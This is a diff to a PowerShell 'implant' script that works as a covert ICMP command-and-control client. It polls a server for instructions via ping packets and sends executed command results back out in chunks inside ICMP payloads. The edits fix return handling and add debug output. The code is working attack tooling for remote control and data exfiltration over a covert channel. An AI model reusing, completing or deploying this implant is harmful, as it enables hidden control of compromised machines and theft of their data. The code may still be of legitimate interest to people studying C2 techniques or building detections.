@@ -27,7 +27,7 @@ $PingOptions.DontFragment = $true
 
 Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
   $MessageBytes = @($MessageType) + $Data
-  $Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions) | Out-Null
+  $Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions)
   return $Reply
 }
 
@@ -46,6 +46,7 @@ while ($True) {
       $Reply = Send-ICMPMessage -MessageType NeedsInstruction
       if ($Reply.Buffer.Count -gt 0) {
         $ServerMessageType = [ServerMessageType]$Reply.Buffer[0]
+				Write-Host "ServerMessageType:" $ServerMessageType
         switch ($ServerMessageType) {
           NeedsPrompt {
             $Prompt = Get-Prompt
@@ -71,13 +72,13 @@ while ($True) {
       }
     }
     SendingCommandResult {
-      $CommandResultBytes = [Text.Encoding]::UTF8.GetBytes($CommandResult)
+			$CommandResultBytes = [Text.Encoding]::UTF8.GetBytes($CommandResult)
       $ChunkSize = [Math]::Min($BufferSize, $CommandResultBytes.Count - $CommandIndex)
       $Chunk = $CommandResultBytes[$CommandIndex..($CommandIndex + $ChunkSize - 1)]
-      Send-ICMPMessage -MessageType CommandResultPart -Data $Chunk
+      Send-ICMPMessage -MessageType CommandResultPart -Data $Chunk | Out-Null
       $CommandIndex += $ChunkSize
       if ($CommandIndex -ge $CommandResultBytes.Count) {
-        Send-ICMPMessage -MessageType CommandResultEnd
+        Send-ICMPMessage -MessageType CommandResultEnd | Out-Null
         $State = [ImplantState]::WaitingForInstruction
       }
     }
